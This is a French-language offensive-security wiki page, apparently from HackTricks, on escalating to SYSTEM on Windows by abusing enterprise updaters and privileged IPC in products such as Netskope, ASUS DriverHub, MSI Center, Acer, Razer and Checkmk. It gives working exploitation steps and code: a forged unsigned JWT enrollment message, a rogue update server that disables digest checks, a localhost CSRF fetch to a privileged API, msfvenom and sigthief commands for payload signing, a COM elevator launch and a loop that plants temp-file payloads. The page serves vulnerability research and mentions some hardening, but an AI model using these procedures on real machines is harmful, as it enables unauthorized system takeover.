# Abuser des programmes de mise à jour d’entreprise et de l’IPC privilégié (p. ex., Netskope, ASUS et MSI)

{{#include ../../banners/hacktricks-training.md}}

Cette page généralise une catégorie de chaînes d’élévation de privilèges locaux sous Windows découvertes dans des agents et programmes de mise à jour de terminaux d’entreprise, qui exposent une surface IPC facilement accessible et un processus de mise à jour privilégié. Un exemple représentatif est Netskope Client pour Windows < R129 (CVE-2025-0309), où un utilisateur à faibles privilèges peut détourner l’inscription vers un serveur contrôlé par l’attaquant, puis livrer un MSI malveillant que le service SYSTEM installe.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Principales idées réutilisables contre des produits similaires :
- Abuser de l’IPC localhost d’un service privilégié pour forcer une réinscription ou une reconfiguration vers un serveur contrôlé par l’attaquant.
- Implémenter les points de terminaison de mise à jour du fournisseur, livrer un Trusted Root CA malveillant et diriger le programme de mise à jour vers un package malveillant « signé ».
- Contourner les vérifications faibles du signataire (listes d’autorisation de CN), les indicateurs de digest facultatifs et les propriétés MSI trop permissives.
- Si l’IPC est « chiffré », dériver la clé/IV à partir d’identifiants machine accessibles en lecture par tous et stockés dans le registre.
- Si le service limite les appelants en fonction du chemin de l’image ou du nom du processus, injecter du code dans un processus autorisé ou en démarrer un en état suspendu, puis amorcer votre DLL au moyen d’une modification minimale du contexte de thread.

Les services TCP locaux personnalisés méritent le même examen de l’identité et des limites d’entrée, même lorsqu’ils exigent un PIN ou d’autres identifiants d’application. Associez l’écouteur à son processus et au compte de service effectif, puis inspectez le binaire/la version exacts déployés et vérifiez si les champs contrôlés par l’appelant sont vérifiés en longueur avant d’être copiés dans des tampons de taille fixe ou utilisés pour construire la commande d’un processus enfant. [Les recommandations de Microsoft sur les dépassements de tampon](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) expliquent pourquoi les entrées externes non vérifiées sont dangereuses dans du code natif privilégié. Un écouteur loopback, un identifiant codé en dur ou un nom de processus ne suffisent pas à établir l’existence d’une corruption mémoire ou d’une exécution en tant que SYSTEM ; l’accessibilité, l’autorisation, le chemin d’exécution et les mesures d’atténuation restent des conditions distinctes. Limitez l’énumération courante à des méthodes passives, plutôt que d’envoyer à un service actif des entrées de longueur susceptible de provoquer un crash.

---
## 1) Forcer l’inscription vers un serveur contrôlé par l’attaquant via l’IPC localhost

De nombreux agents intègrent un processus d’interface utilisateur en mode utilisateur qui communique avec un service SYSTEM via TCP localhost à l’aide de JSON.

Observé dans Netskope :
- Interface utilisateur : stAgentUI (faible intégrité) ↔ Service : stAgentSvc (SYSTEM)
- ID de commande IPC 148 : IDP_USER_PROVISIONING_WITH_TOKEN

Déroulement de l’exploitation :
1) Créer un jeton d’inscription JWT dont les claims contrôlent l’hôte backend (p. ex., AddonUrl). Utiliser alg=None pour qu’aucune signature ne soit nécessaire.
2) Envoyer le message IPC qui appelle la commande d’inscription avec votre JWT et le nom du tenant :

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Le service commence à interroger votre serveur pirate pour obtenir les informations d’inscription/de configuration, par exemple :
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Remarques :
- Si la vérification de l’appelant est fondée sur le chemin/le nom, envoyez la requête depuis un binaire fournisseur allow-listed (voir §4).<sup>[[1]](#references)[[2]](#references)</sup>

### IPC de gestion exposée sur le réseau

Cette limite de confiance ne se limite pas toujours à localhost. Dans le cas signalé de MyReport Updater 2.1.1, un service `LocalSystem` écoutait sur toutes les interfaces et acceptait une modification de configuration gRPC non authentifiée concernant l’hôte de référence, le port et le mode de fonctionnement. Pour la variante à distance, il fallait à la fois accéder au listener depuis le réseau et permettre au service de se connecter à l’hôte de référence choisi. Évaluez ces conditions séparément de la possibilité que le flux de mise à jour ultérieur franchisse la limite d’écriture de fichiers.<sup>[[16]](#references)</sup>

---
## 2) Détourner le canal de mise à jour pour exécuter du code en tant que SYSTEM

Une fois que le client communique avec votre serveur, implémentez les endpoints attendus et redirigez-le vers un MSI contrôlé par l’attaquant. Séquence typique :

1) /v2/config/org/clientconfig → Renvoyez une configuration JSON avec un intervalle de mise à jour très court, par exemple :
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Retourne un certificat CA PEM. Le service l’installe dans le magasin Trusted Root de l’ordinateur local.
3) /v2/checkupdate → Fournissez des métadonnées pointant vers un MSI malveillant et une fausse version.

Contournement des vérifications courantes observées sur le terrain :
- Liste d’autorisation des CN des signataires : le service peut se contenter de vérifier que le Subject CN est égal à « netSkope Inc » ou « Netskope, Inc. ». Votre CA frauduleuse peut émettre un certificat leaf avec ce CN et signer le MSI.
- Propriété CERT_DIGEST : incluez une propriété MSI bénigne nommée CERT_DIGEST. Aucune vérification n’est effectuée à l’installation.
- Vérification facultative du digest : un indicateur de configuration (par exemple, check_msi_digest=false) désactive la validation cryptographique supplémentaire.

Résultat : le service SYSTEM installe votre MSI depuis
C:\ProgramData\Netskope\stAgent\data\*.msi
et exécute du code arbitraire en tant que NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Leçon sur le contournement des correctifs : si un fournisseur réagit en ajoutant une petite liste de domaines « de confiance » plutôt qu’en authentifiant cryptographiquement la source des mises à jour, recherchez des redirecteurs ou des reverse proxies appartenant au fournisseur qui permettent toujours de rediriger le trafic. Dans le cas de Netskope, des recherches publiques ultérieures ont montré qu’une liste d’autorisation datant de l’ère R129 pouvait toujours être contournée via `rproxy.goskope.com`, qui relayait du contenu Azure App Service contrôlé par l’attaquant. Considérez les listes d’autorisation d’hôtes comme un ralentisseur, et non comme une limite de confiance.<sup>[[14]](#references)</sup>

Un autre mode de défaillance repose sur des **métadonnées de package cohérentes entre elles, mais non authentifiées**. Dans le cas de MyReport, une référence contrôlée par l’attaquant servait une archive modifiée tandis qu’un intermédiaire modifiait les réponses du fournisseur contenant le digest MD5 et la taille avant qu’elles n’atteignent le programme de mise à jour. La correspondance de ces valeurs vérifiait la cohérence des réponses, pas leur provenance du fournisseur ; aucune collision MD5 n’était nécessaire. Un répertoire d’installation choisi par l’appelant a ensuite transformé l’extraction privilégiée en une frontière d’écriture de fichiers. Le primitive de chargement de DLL qui en résulte est décrite dans [l’enchaînement d’une écriture de fichier arbitraire avec un détournement de DLL](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack).<sup>[[16]](#references)</sup>

---
## 3) Falsification de requêtes IPC chiffrées (si présentes)

À partir de R127, Netskope a encapsulé le JSON IPC dans un champ encryptData qui ressemble à du Base64. L’analyse inverse a révélé un chiffrement AES avec une clé et un IV dérivés de valeurs du registre lisibles par tout utilisateur :
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Les attaquants peuvent reproduire le chiffrement et envoyer des commandes chiffrées valides depuis un compte utilisateur standard.<sup>[[1]](#references)[[2]](#references)</sup> Conseil général : si un agent se met soudainement à « chiffrer » son IPC, recherchez des identifiants d’appareil, des GUID de produit et des identifiants d’installation sous HKLM susceptibles de servir de matériau.

---
## 4) Contournement des listes d’autorisation des appelants IPC (vérifications de chemin/nom)

Certains services tentent d’authentifier le pair en récupérant le PID de la connexion TCP et en comparant le chemin/nom de l’image à ceux de binaires du fournisseur autorisés, situés sous Program Files (par exemple, stagentui.exe, bwansvc.exe, epdlp.exe).

Deux contournements pratiques :
- Injection de DLL dans un processus autorisé (par exemple, nsdiag.exe), puis relais de l’IPC depuis ce processus.
- Lancer un binaire autorisé en état suspendu et amorcer votre DLL proxy sans CreateRemoteThread (voir §5) afin de respecter les règles anti-altération appliquées par le pilote.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Injection compatible avec la protection contre les altérations : processus suspendu + patch NtContinue

Les produits embarquent souvent un pilote minifilter/de rappels OB (par exemple, Stadrv) pour retirer les droits dangereux des handles vers les processus protégés :
- Processus : retire PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread : limite les droits à THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un chargeur en mode utilisateur fiable qui respecte ces contraintes :
1) Créer un processus à partir d’un binaire du fournisseur avec CREATE_SUSPENDED.
2) Obtenir les handles encore autorisés : PROCESS_VM_WRITE | PROCESS_VM_OPERATION sur le processus, et un handle de thread avec THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ou simplement THREAD_RESUME si vous patchez le code à un RIP connu).
3) Remplacer ntdll!NtContinue (ou un autre thunk précoce dont le mappage est garanti) par un petit stub qui appelle LoadLibraryW avec le chemin de votre DLL, puis revient à l’exécution.
4) Appeler ResumeThread pour déclencher votre stub dans le processus et charger votre DLL.

Comme vous n’avez jamais utilisé PROCESS_CREATE_THREAD ou PROCESS_SUSPEND_RESUME sur un processus déjà protégé (vous l’avez créé), la politique du pilote est respectée.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Outils pratiques
- NachoVPN (plugin Netskope) automatise la création d’une CA frauduleuse, la signature d’un MSI malveillant et la mise à disposition des endpoints nécessaires : /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope est un client IPC personnalisé qui forge des messages IPC arbitraires (éventuellement chiffrés en AES) et inclut l’injection dans un processus suspendu pour émettre les requêtes depuis un binaire autorisé.<sup>[[4]](#references)</sup>

## 7) Workflow rapide de triage des surfaces de mise à jour/IPC inconnues

Face à un nouvel agent endpoint ou à une suite d’utilitaires pour carte mère, un workflow rapide suffit généralement pour déterminer si vous avez affaire à une cible prometteuse d’élévation de privilèges :<sup>[[6]](#references)</sup>

1) Énumérez les listeners de loopback et associez-les aux processus du fournisseur :

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Énumérer les pipes nommés candidats :

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Extraire les données de routage stockées dans le registre et utilisées par les serveurs IPC basés sur des plugins :

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Extrayez d’abord les noms des endpoints, les clés JSON et les ID de commande du client en mode utilisateur. Les frontends Electron/.NET empaquetés leakent souvent le schéma complet :

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Recherchez le véritable prédicat de confiance, pas seulement le code path qui finit par lancer le processus :

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Patterns à prioriser :
- `CryptQueryObject`/l’analyse de certificats sans `WinVerifyTrust` signifie généralement que « le certificat existe » a été interprété comme « le certificat est approuvé », ce qui permet le clonage de certificats ou d’autres astuces de faux signataire.
- Les vérifications de sous-chaînes/suffixes dans `Origin`, `Referer`, les URL de téléchargement, les noms de processus ou les CN de signataires ne constituent pas une authentification. `contains(".vendor.com")` est généralement exploitable avec des domaines ressemblants contrôlés par l’attaquant.
- Si l’interface graphique à faibles privilèges décide que « le fichier est approuvé » et que le broker SYSTEM se contente de consommer ce résultat, patcher ou réimplémenter la DLL/JS côté client permet souvent de contourner entièrement la frontière (séparation de validation à la manière de Razer).
- Si le broker copie un payload vers `%TEMP%`/`C:\Windows\Temp`, puis le valide ou le planifie depuis ce chemin, testez immédiatement les fenêtres de remplacement TOCTOU et les modules de plug-in voisins qui exposent d’autres wrappers `ExecuteTask()` avec des vérifications plus faibles.<sup>[[6]](#references)</sup>

Pour les cibles qui utilisent beaucoup les named pipes, PipeViewer permet de repérer rapidement les DACL faibles et les pipes accessibles à distance avant de commencer à rétroconcevoir le protocole en profondeur.<sup>[[11]](#references)</sup>

Si la cible authentifie les appelants uniquement à l’aide du PID, du chemin de l’image ou du nom du processus, considérez cela comme un obstacle mineur plutôt que comme une frontière : injecter du code dans le client légitime, ou établir la connexion depuis un processus sur liste d’autorisation, suffit souvent à satisfaire les vérifications du serveur. Pour les named pipes en particulier, [cette page sur l’usurpation de client et l’abus de pipes](named-pipe-client-impersonation.md) décrit plus en détail la primitive.

Pour un **broker privilégié de nettoyage ou de restauration**, examinez la frontière de confiance des chemins ainsi que l’ACL du pipe. Un appelant moins privilégié peut parfois choisir une destination de restauration ou renommer un artefact de sauvegarde préparé dans un répertoire partagé, même si l’exécutable du service et son répertoire d’installation sont protégés. Vérifiez séparément que l’appelant peut accéder à la commande de restauration, modifier l’entrée préparée exacte ou son nom de fichier, que le broker s’exécute sous une identité plus privilégiée et que son opération de restauration écrit effectivement dans le chemin protégé sélectionné. Un répertoire de préparation accessible en écriture ou un pipe lisible ne suffit pas à établir la possibilité d’une écriture privilégiée arbitraire ; le mappage de destination et le comportement du service doivent être examinés dans le code ou testés de manière contrôlée. N’invoquez pas une commande de nettoyage inconnue lors d’une énumération passive, car elle peut supprimer des fichiers utilisateur.

---
## 8) Brokers d’add-ins modulaires authentifiés uniquement par des signatures de fournisseur (modèle Lenovo Vantage)

Une variante plus récente à rechercher est le **broker RPC à client signé** : un processus de bureau Lenovo signé, à faibles privilèges, communique avec un service SYSTEM, et le service achemine des commandes JSON vers un ensemble d’add-ins décrits en XML sous `%ProgramData%`. Dès qu’une exécution de code est obtenue **dans n’importe quel client signé accepté**, chaque contrat `runas="system"` fait partie de votre surface d’attaque.<sup>[[15]](#references)</sup>

Primitives à forte valeur observées dans les recherches sur Lenovo Vantage :
- **Faire confiance à l’appelant parce qu’il est signé par le fournisseur** : des chercheurs ont obtenu un contexte authentifié en copiant un EXE signé par Lenovo dans un répertoire accessible en écriture et en satisfaisant un DLL side-load (`profapi.dll`), de sorte qu’un code arbitraire s’exécute dans un client déjà approuvé par le service.
- **Découverte de la surface d’attaque à partir des manifestes** : les add-ins sont déclarés sous `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` ; plusieurs contrats s’exécutent en tant que `SYSTEM`, si bien que l’énumération de ces manifestes révèle souvent les véritables opérations privilégiées plus rapidement que la rétroconception du broker lui-même.
- **Bugs par commande derrière le canal authentifié** : une fois dans le client de confiance, des recherches publiques ont révélé des conditions de concurrence combinées à du path traversal dans les opérations de mise à jour/d’installation, un abus de SQL brut dans des bases de données de paramètres privilégiées et des vérifications de chemins de registre fondées sur des sous-chaînes, qui permettaient des écritures en dehors de la ruche prévue.

Recon utile sur une cible :

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

À retenir : chaque fois qu’une suite d’outils expose un broker qui authentifie d’abord le **processus appelant**, puis distribue les requêtes à des dizaines de commandes de plugins/add-ins, ne vous arrêtez pas après avoir contourné le contrôle de confiance initial. Extrayez la table manifeste/contrat et fuzz chaque commande à privilèges élevés indépendamment ; le canal authentifié dissimule généralement plusieurs bugs de seconde étape.

---
## 1) CSRF du navigateur vers localhost contre des API HTTP privilégiées (ASUS DriverHub)

DriverHub fournit un service HTTP en mode utilisateur (ADU.exe) sur 127.0.0.1:53000, qui attend des appels du navigateur provenant de https://driverhub.asus.com. Le filtre d’origine effectue simplement `string_contains(".asus.com")` sur l’en-tête Origin et sur les URL de téléchargement exposées par `/asus/v1.0/*`. Tout hôte contrôlé par un attaquant, tel que `https://driverhub.asus.com.attacker.tld`, passe donc le contrôle et peut envoyer des requêtes modifiant l’état depuis JavaScript.<sup>[[6]](#references)</sup> Consultez [les bases de CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md) pour découvrir d’autres méthodes de contournement.

Déroulement pratique :
1) Enregistrez un domaine contenant `.asus.com` et hébergez-y une page Web malveillante.
2) Utilisez `fetch` ou XHR pour appeler un endpoint privilégié (par ex., `Reboot`, `UpdateApp`) sur `http://127.0.0.1:53000`.
3) Envoyez le corps JSON attendu par le gestionnaire : le code JS compressé du frontend révèle le schéma ci-dessous.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Même l’interface CLI PowerShell présentée ci-dessous réussit lorsque l’en-tête Origin est usurpé avec la valeur de confiance :

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Toute visite du site de l’attaquant dans un navigateur devient donc un CSRF local en 1 clic (ou 0 clic via `onload`) qui pilote un helper SYSTEM.

---
## 2) Vérification non sécurisée de la signature de code et clonage de certificat (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` télécharge des exécutables arbitraires définis dans le corps JSON et les met en cache dans `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La validation de l’URL de téléchargement réutilise la même logique de sous-chaîne ; `http://updates.asus.com.attacker.tld:8000/payload.exe` est donc accepté. Après le téléchargement, ADU.exe vérifie simplement que le fichier PE contient une signature et que la chaîne Subject correspond à ASUS avant de l’exécuter : pas de `WinVerifyTrust`, pas de validation de la chaîne.

Pour exploiter ce mécanisme :
1) Créez un payload (par ex. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clonez le signataire d’ASUS dans celui-ci (par ex. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hébergez `pwn.exe` sur un domaine ressemblant à `.asus.com` et déclenchez UpdateApp via le CSRF de navigateur ci-dessus.

Comme les filtres Origin et URL reposent tous deux sur des sous-chaînes et que la vérification du signataire ne fait que comparer des chaînes, DriverHub récupère et exécute le binaire de l’attaquant dans son contexte élevé.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU dans les chemins de copie/exécution de l’updater (MSI Center CMD_AutoUpdateSDK)

Le service SYSTEM de MSI Center expose un protocole TCP où chaque trame se compose de `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Le composant principal (Component ID `0f 27 00 00`) fournit `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Son handler :
1) Copie l’exécutable fourni vers `C:\Windows\Temp\MSI Center SDK.exe`.
2) Vérifie la signature via `CS_CommonAPI.EX_CA::Verify` (le sujet du certificat doit être égal à “MICRO-STAR INTERNATIONAL CO., LTD.” et `WinVerifyTrust` doit réussir).
3) Crée une tâche planifiée qui exécute le fichier temporaire en tant que SYSTEM avec des arguments contrôlés par l’attaquant.

Le fichier copié n’est pas verrouillé entre la vérification et `ExecuteTask()`. Un attaquant peut :
- Envoyer la trame A pointant vers un binaire légitime signé par MSI (garantissant que la vérification de signature réussit et que la tâche est mise en file d’attente).
- Lancer une course en envoyant de façon répétée des messages de trame B pointant vers un payload malveillant, pour écraser `MSI Center SDK.exe` juste après la fin de la vérification.

Lorsque le planificateur déclenche la tâche, il exécute le payload écrasé sous SYSTEM, bien qu’il ait validé le fichier d’origine. Une exploitation fiable utilise deux goroutines/threads qui envoient en boucle des commandes CMD_AutoUpdateSDK jusqu’à remporter la fenêtre TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Exploitation d’IPC personnalisés au niveau SYSTEM et de l’impersonation (MSI Center + Acer Control Centre)

### Jeux de commandes TCP de MSI Center
- Chaque plugin/DLL chargé par `MSI.CentralServer.exe` reçoit un Component ID stocké sous `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Les 4 premiers octets d’une trame sélectionnent ce composant, ce qui permet aux attaquants d’acheminer des commandes vers des modules arbitraires.
- Les plugins peuvent définir leurs propres task runners. `Support\API_Support.dll` expose `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` et appelle directement `API_Support.EX_Task::ExecuteTask()` **sans validation de signature** : tout utilisateur local peut lui indiquer `C:\Users\<user>\Desktop\payload.exe` et obtenir de façon déterministe une exécution SYSTEM.
- L’interception du trafic loopback avec Wireshark ou l’instrumentation des binaires .NET dans dnSpy révèle rapidement la correspondance entre les composants et les commandes ; des clients personnalisés en Go/Python peuvent ensuite rejouer les trames.<sup>[[6]](#references)</sup>

### Named pipes d’Acer Control Centre et niveaux d’impersonation
- `ACCSvc.exe` (SYSTEM) expose `\\.\pipe\treadstone_service_LightMode`, et sa ACL discrétionnaire autorise les clients distants (par ex. `\\TARGET\pipe\treadstone_service_LightMode`). L’envoi de l’ID de commande `7` accompagné d’un chemin de fichier appelle la routine de lancement de processus du service.
- La bibliothèque cliente sérialise un octet de terminaison magique (113) avec les arguments. L’instrumentation dynamique avec Frida/`TsDotNetLib` (voir [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) pour des conseils d’instrumentation) montre que le handler natif convertit cette valeur en `SECURITY_IMPERSONATION_LEVEL` et en SID d’intégrité avant d’appeler `CreateProcessAsUser`.
- Remplacer 113 (`0x71`) par 114 (`0x72`) fait basculer vers la branche générique, qui conserve le jeton SYSTEM complet et définit un SID de haute intégrité (`S-1-16-12288`). Le binaire lancé s’exécute donc en tant que SYSTEM sans restriction, localement comme entre machines.
- Combinez cela avec le flag d’installation exposé (`Setup.exe -nocheck`) pour installer ACC même sur des VM de laboratoire et tester le pipe sans matériel du fournisseur.<sup>[[6]](#references)</sup>

Ces bugs IPC montrent pourquoi les services localhost doivent imposer une authentification mutuelle (SID ALPC, filtres `ImpersonationLevel=Impersonation`, filtrage des jetons) et pourquoi le helper de chaque module permettant « d’exécuter un binaire arbitraire » doit appliquer les mêmes vérifications de signature.

---
## 3) Helpers COM/IPC « elevator » reposant sur une validation faible en mode utilisateur (Razer Synapse 4)

Razer Synapse 4 a ajouté un autre exemple utile à cette famille : un utilisateur peu privilégié peut demander à un helper COM de lancer un processus via `RzUtility.Elevator`, tandis que la décision de confiance est déléguée à une DLL en mode utilisateur (`simple_service.dll`) au lieu d’être appliquée correctement au sein de la frontière privilégiée.

Chemin d’exploitation observé :
- Instancier l’objet COM `RzUtility.Elevator`.
- Appeler `LaunchProcessNoWait(<path>, "", 1)` pour demander un lancement élevé.
- Dans le PoC public, le contrôle de signature PE dans `simple_service.dll` est neutralisé avant l’envoi de la requête, ce qui permet de lancer un exécutable arbitraire choisi par l’attaquant.<sup>[[6]](#references)[[10]](#references)</sup>

Invocation PowerShell minimale :

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Conclusion générale : lors de l’analyse de suites « helper », ne vous arrêtez pas au TCP localhost ni aux named pipes. Vérifiez la présence de classes COM nommées `Elevator`, `Launcher`, `Updater` ou `Utility`, puis déterminez si le service privilégié valide réellement lui-même le binaire cible ou s’il se fie simplement à un résultat calculé par une DLL cliente patchable en mode utilisateur. Ce schéma ne se limite pas à Razer : toute architecture séparée où le broker hautement privilégié consomme une décision d’autorisation ou de refus provenant de la partie à faibles privilèges constitue une surface potentielle de privesc.


---
## Exécution prévisible d’un script temporaire lors de la réparation MSI (Checkmk Agent / CVE-2024-0670)

Certains agents Windows exécutent encore des actions privilégiées en écrivant un fichier `.cmd` temporaire dans `C:\Windows\Temp`, puis en l’exécutant en tant que `SYSTEM`. Si le nom du fichier est prévisible et que le service ne recrée pas les fichiers existants de manière sûre, un utilisateur à faibles privilèges peut créer à l’avance le futur fichier temporaire en lecture seule et amener le processus privilégié à exécuter du contenu contrôlé par l’attaquant à la place de son propre script.

Observé dans les versions vulnérables de Checkmk Agent :
- modèle de fichier temporaire : `cmk_all_<PID>_1.cmd`
- branches concernées : `2.0.0`, `2.1.0`, `2.2.0`
- déclencheur : **réparation** MSI du package agent mis en cache<sup>[[8]](#references)[[9]](#references)</sup>

Procédure pratique :
1. Estimez une plage réaliste de PID à partir des PID des processus actuels ou du PID de l’agent en cours d’exécution.
2. Écrivez une charge utile `.cmd` courte en **ASCII** (`Set-Content -Encoding Ascii` ou redirection `cmd.exe` ; évitez la sortie PowerShell UTF-16 pour les fichiers batch).
3. Créez en masse des fichiers `C:\Windows\Temp\cmk_all_<PID>_1.cmd` sur la plage candidate et marquez chacun en lecture seule.
4. Déclenchez une réparation du MSI mis en cache pour que le service privilégié tente de recréer le script temporaire, puis l’exécute.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Si le produit vulnérable est installé avec Windows Installer, associez le fichier MSI mis en cache au nom aléatoire sous `C:\Windows\Installer` au nom de son produit avant de déclencher la réparation :<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Notes opérationnelles :
- `qwinsta` est utile lorsque `msiexec /fa` échoue depuis un shell WinRM non interactif et que vous devez déterminer si une session de bureau existante ou déconnectée peut déclencher correctement la réparation.<sup>[[7]](#references)</sup>
- Ce schéma s’applique aussi à d’autres agents de terminaux et programmes de mise à jour qui **préparent des scripts temporaires dans des emplacements accessibles en écriture à tous, puis les exécutent en tant que SYSTEM**. Recherchez les noms prévisibles, l’absence de création exclusive et les flux de réparation/mise à jour pouvant être déclenchés à la demande.

### Réparation interactive de l’installateur et console privilégiée

PDF24 Creator 11.15.1 illustre un risque distinct lié à la réparation MSI : son action personnalisée d’installation de l’imprimante peut ouvrir une console visible avec des droits SYSTEM pendant la réparation. Le fournisseur a modifié l’installateur MSI en version 11.15.2 pour corriger ce comportement. Une ancienne version du produit constitue uniquement une piste de triage. Vérifiez le package MSI enregistré ou accessible, si cet utilisateur peut lancer une réparation, si l’action personnalisée vulnérable et le délai lié au fichier journal sont présents, et si un bureau interactif peut rendre la console visible. Le délai signalé utilisait un oplock sur `faxPrnInst.log` ; le fait que le fichier soit accessible en écriture ne constitue pas à lui seul la condition d’accès. Un shell non interactif, un package inaccessible ou un installateur corrigé peuvent interrompre la chaîne. Ce problème ne dépend pas de `AlwaysInstallElevated` et diffère du remplacement d’un script temporaire prévisible.

---
## Détournement de la chaîne d’approvisionnement à distance via une validation faible du programme de mise à jour (WinGUp / Notepad++)

Entre juin 2025 et décembre 2025, des attaquants ayant compromis l’infrastructure d’hébergement derrière le mécanisme de mise à jour de Notepad++ ont servi sélectivement des manifestes malveillants à des victimes choisies. Les anciens programmes de mise à jour basés sur WinGUp ne vérifiaient pas entièrement l’authenticité des mises à jour ; une réponse XML malveillante pouvait donc rediriger les clients vers des URL contrôlées par les attaquants. Comme le client acceptait le contenu HTTPS sans exiger à la fois une chaîne de certificats de confiance et une signature PE valide pour l’installateur téléchargé, les victimes récupéraient et exécutaient un `update.exe` NSIS piégé.<sup>[[12]](#references)[[13]](#references)</sup>

Déroulement opérationnel (aucun exploit local requis) :
1. **Interception de l’infrastructure** : compromettre le CDN/l’hébergement et répondre aux vérifications de mise à jour avec des métadonnées d’attaquant pointant vers une URL de téléchargement malveillante.
2. **NSIS piégé** : l’installateur récupère/exécute une charge utile et exploite deux chaînes d’exécution :
   - **Bring-your-own signed binary + sideload** : inclure le binaire signé `BluetoothService.exe` de Bitdefender et déposer un `log.dll` malveillant dans son chemin de recherche. Lorsque le binaire signé s’exécute, Windows charge `log.dll` par sideload ; cette DLL déchiffre la porte dérobée Chrysalis et la charge de manière réflexive (protégée par Warbird et utilisant le hachage d’API pour compliquer la détection statique).
   - **Injection de shellcode par script** : NSIS exécute un script Lua compilé qui utilise des API Win32 (par ex., `EnumWindowStationsW`) pour injecter du shellcode et déployer Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Mesures de renforcement et éléments de détection pour tout programme de mise à jour automatique :
- Exiger la **vérification du certificat et de la signature** de l’installateur téléchargé (épingler le signataire du fournisseur, rejeter les CN/chaînes non concordants) et signer le manifeste de mise à jour lui-même (par ex., XMLDSig). Bloquer les redirections contrôlées par le manifeste tant qu’elles n’ont pas été validées.
